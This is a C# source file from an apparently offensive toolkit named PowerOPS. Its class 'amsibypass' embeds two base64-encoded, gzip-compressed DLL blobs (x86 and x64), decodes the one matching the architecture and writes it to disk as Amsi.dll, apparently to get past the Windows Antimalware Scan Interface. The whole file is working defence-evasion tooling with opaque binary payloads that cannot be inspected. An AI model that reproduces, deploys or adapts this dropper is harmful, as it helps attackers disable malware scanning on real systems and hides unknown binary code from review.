using System;
using System.IO;
using System.IO.Compression;

namespace PowerOPS
{
    class amsibypass
    {
        // (de)compress code from: http://www.herlitz.nu/2011/11/03/compress-a-file-using-gzip-and-convert-it-to-base64-and-back-using-c/

        public static byte[] base64_decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static void Amsi(string arch)
        {
            BinaryWriter bw = new BinaryWriter(new FileStream(Directory.GetCurrentDirectory() + "\\Amsi.dll", FileMode.Create));

            string AmsiX86dll = "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";
            string AmsiX64dll = "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";

            if (arch == "AMD64")
            {
                byte[] decoded = base64_decode(AmsiX64dll);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            else
            {
                byte[] decoded = base64_decode(AmsiX86dll);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }

            bw.Close();
        }
    }
}
